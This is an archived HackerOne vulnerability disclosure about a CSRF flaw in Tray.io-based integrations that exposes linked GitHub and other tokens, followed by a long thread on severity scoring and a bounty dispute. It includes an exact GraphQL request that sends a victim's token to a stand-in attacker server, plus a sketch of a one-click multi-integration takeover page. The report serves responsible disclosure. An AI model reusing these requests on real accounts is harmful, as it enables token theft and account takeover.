---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-request-forgery-csrf
  - env/web
substate: "resolved"
weakness: "Cross-Site Request Forgery (CSRF)"
enriched: true
date: 2023-06-19
submitted: 2022-10-08T11:11:49.758Z
bounty_usd: null
votes: 168
cve: []
program: "[[programs/security|HackerOne]]"
reporter: "medmahmoudi"
source: "https://hackerone.com/reports/1727221"
title: "Improper CSRF token validation allows attackers to access victim's accounts linked to Hackerone"
---
# Improper CSRF token validation allows attackers to access victim's accounts linked to Hackerone

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 168 | **Program:** HackerOne | **Disclosed:** 2023-06-19

- Report: [https://hackerone.com/reports/1727221](https://hackerone.com/reports/1727221)
- CWE: Cross-Site Request Forgery (CSRF)
- Submitted: 2022-10-08T11:11:49.758Z

## Timeline

- **Report Filed**
- **Report Needs More Info**
- **Report New**
- **2022-10-14** @h1_analyst_magnus: Hello @medmahmoudi,

Thank you for your submission! We have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.

Thanks,
@h1_analyst_magnus
- **2022-10-16** @medmahmoudi: Greetings ! I found that the attacker could easily get the access token of the victim's oauth application. This could be done through the same query I have discussed earlier. When setting up a Tray.io based integration in Hackerone. Your browser will send some requests to Tray's graphql.

{F1989034}
These requests are authenticated with Bearer token that Hackerone behind the scenes gives to its users. The attacker could just check its proxy history for requests to ```tray.io/graphql``` and grab its Bearer token.

Then he could use it in the following request:

```
POST /graphql HTTP/2
Host: tray.io
Content-Length: 512
Sec-Ch-Ua: "Not;A=Brand";v="99", "Chromium";v="106"
Accept: */*
Content-Type: application/json
Sec-Ch-Ua-Mobile: ?0
Authorization: Bearer <Attacker Token>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.91 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Origin: https://hackerone.integration-configuration.com
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://hackerone.integration-configuration.com/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

{"operationName":"CallConnector","variables":{"input":{"connector":"github","version":"2.2","operation":"raw_http_request","authId":"22583997-4aa0-4bb8-87cb-28326dc97868","input":"{\"method\":\"GET\",\"parse_response\":\"true\",\"include_raw_body\":\"false\",\"url\":{\"full_url\":\"http://<ATTACKER SERVER>\"}}"}},"query":"mutation CallConnector($input: ConnectorCallInput!) {\n  callConnector(input: $input) {\n    output\n    __typename\n  }\n}\n"}
```

{F1989036}

Replace <ATTACKER SERVER> by your own server's url. The Github access token of the victim would be in the headers of request logged by the attacker's server. The same thing could be done to all the other integrations that are built on Tray.io embedded product.
- **2022-10-24** @rutger77: Hi @medmahmoudi Thanks for your submission. We're discussing final ruling on this report, and when/if a fix will be implemented and will get back to you as soon as possible.
- **External User Joined**
- **External User Joined**
- **External User Joined**
- **External User Joined**
- **2022-11-01** @medmahmoudi: Hey everyone ! Any updates on this issue ?
- **2022-11-01** @rutger77: Hi @medmahmoudi Thanks for your patience, our partner (Tray) is still investigating this, we'll get back to you soon.
- **2022-11-15** @medmahmoudi: Hey @rutger77 ! The state of the report hasn't changed from "new" since I have sent the report. It's been more than a month now and I am starting to worry. Is the state of my report relevant to Tray's investigation and fix ?

Best Regards,
MedMahmoudi
- **2022-11-17** @rutger77: Hi @medmahmoudi I'm so sorry for the silence, I've been pushing Tray for the state of this. They have come to the conclusion this is an issue indeed.  They've proposed a fix for it internally, but there are a lot of dependencies around it, so no estimate on when they fix will be able to fix this.

In the mean time, I'll go ahead and triage this.
- **Report Severity Updated**
- **Report Triaged**
- **2022-11-18** @medmahmoudi: Hi @rutger77 
Thanks for triaging my report. I respect your decision of severity. However, I am afraid I disagree. I would consider the impact limited to "High" if the impact was limited to Github's integration. Meanwhile, the attack is reproducible against all other integrations that are built on top of Tray. Which to my opinion, makes the impact critical.

Examples of vulnerable integrations: Microsoft Teams, Jira, Azure DevOps, Splunk..

### Takeover of multiple integrations with one click

To takeover one integration, the victim needs to visit one link crafted by the attack. The attacker could prepare a list of exploit url. Each url would perform the CSRF to takeover one integrations. (Link 1: impacts Github, Link 2: impacts Jira..)

The attacker hosts an exploit on his server. The exploit would open all the urls in the exploit list into different windows. If the victim has any of the vulnerable integrations installed. The attacker would have access to his accounts seconds after he visits the exploit page.

Why would this work ? The victim wouldn't be asked to Authorize to Hackerone(Tray.io behind the scenes) when they visit the attacker's exploit url. 

If I record a video where I takeover multiple integrations with one click from the victim side, would you consider bumping the severity ?

Best Regards,
MedMahmoudi
- **2022-11-21** @rutger77: Hi @medmahmoudi 

Thanks for your reply. We use the CVSS calculator to determine the severity of a report. 

Two major factors in your report are: 
1. Attack complexity. This resolves to High, as you need specific network access to intercept the user.
2. User Interaction. This one resolves to Required, as the user needs to connect to a network where the attacker also has access.

This brings the severity to high on our side. I Advise you to take a look at the calculator and see how it works and several parts of it influence the severity of the report. 

Best Regards,

Rutger
- **2022-11-21** @medmahmoudi: Hi @rutger77,
Thanks for the explanation. This is understandable.
I am glad for scoring it ! Please let me know if you have more questions on your side.

Best Regards,
MedMahmoudi
- **2022-12-03** @medmahmoudi: Hey @rutger77 ! Are there any updates on the bounty ?
- **2022-12-09** @medmahmoudi: Any updates ?
- **2022-12-12** @rutger77: Hi @medmahmoudi 

We are in process of discussing this with Tray.IO to see who should take ownership of paying this bounty to make sure you get paid the appropriate amount. I will keep you posted.

Rutger
- **2022-12-26** @medmahmoudi: Hey @rutger77 
It's almost 2023 ! I hate to keep spamming, but where are we at with the bounty ?

Happy new year !
- **Hacker Requested Mediation**
- **2023-01-09** @rutger77: Happy new year @medmahmoudi

Thanks for your patience and sorry for the delay here as we were on holiday past few weeks. 

I hope you understand that this is an unusual situation for us as we rely on the owner of the integrations (Tray.IO) to provide us with the appropriate information. Usually we will wait with payout until the third-party vendor has fixed the issue. I've asked them for an update about this.

About the bounty: As the report was submitted on October 8th, we use the bounty amounts that were applicable at that moment. For a high severity at that time it was $7,879 see https://hackerone.com/security/bounty_table_versions?change=2022-09-30T17%3A00%3A10.789Z for more information about the history of bounty amounts.
Next to that, as this is an issue with a third-party vendor we typically pay out 20% of the bounty as a bonus, not the entire bounty.

I hope this helps to understand things and I hope to hear from Tray quickly.

Best regards,

Rutger
- **2023-01-09** @medmahmoudi: Hey @rutger77,

I can understand why the bounty would be 7,879$ instead of 12,500. But can you clarify the following statement: "Next to that, as this is an issue with a third-party vendor we typically pay out 20% of the bounty as a bonus, not the entire bounty."

I don't see this rule mentioned anywhere in your policy. In a real world scenario, if a malicious threat actor would exploit this issue, the damage would cost Hackerone much more than the entire bounty. It's not fair to reduce the bounty to 20%, especially that this rule is not mentioned anywhere in your policy.
- **2023-01-10** @rutger77: Hi @medmahmoudi 

I understand what you're saying, but as this concerns systems we do not control at all this usually would be considered out of scope and would be closed as such. Us offering part of the bounty is a way to show our gratitude.

Best regards,

Rutger
- **2023-01-11** @medmahmoudi: You chose to use Tray.io. You could have coded every single integration manually, but you didn't. It was your team's decision to rely on someone else's code. You consciously chose to take the risk. The least you could do is take full responsibility for it.

Also you chose to triage the vulnerability and you decided the severity. You could have asked me to report it to the vendor from the beginning and you could have closed the report, but you didn't. Because the vulnerability is right at the center of your scope, and the impact is too high to be ignored.

I have been patient for 90 days and I have respected all your guidelines. What is happening here is not you showing "gratitude". It's far from that. This is called disrespect. I am not taking your 20%. I deserve the full bounty, I know it, you know it and the whole world knows it.
- **Report Collaborator Invited**
- **2023-02-08** @medmahmoudi: Greetings,

Are there any updates on this issue ?
- **2023-02-13** @jobert: Hi @medmahmoudi - although I appreciate the conversation you had with the team, I'd like to point out that our decision on the reward is final. Our policy is to pay 1/5th of the bounty for a vulnerability that is in a system that is not under our control, which is the case here. Prior to this policy, we wouldn't have awarded a bounty for it at all. We're more than happy to publicly disclose your finding once it has been remediated so you can have others weigh in.
- **2023-02-13** @medmahmoudi: Hey Jobert ! Thanks for getting in on the action.
Despite lack of clarity in the program policy, I respect your final decision. I suggest making this rule clear in your program policy to avoid confusion in the future. 

As for disclosure, I'd be happy to disclose once the fix takes place. 

With that being said, I'll go ahead and report it to the Vendor. 

Regards,
MedMahmoudi
- **Bounty Awarded**
- **2023-05-03** @medmahmoudi: Greetings, can we disclose ?
- **2023-05-19** @medmahmoudi: Still waiting for disclosure..
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
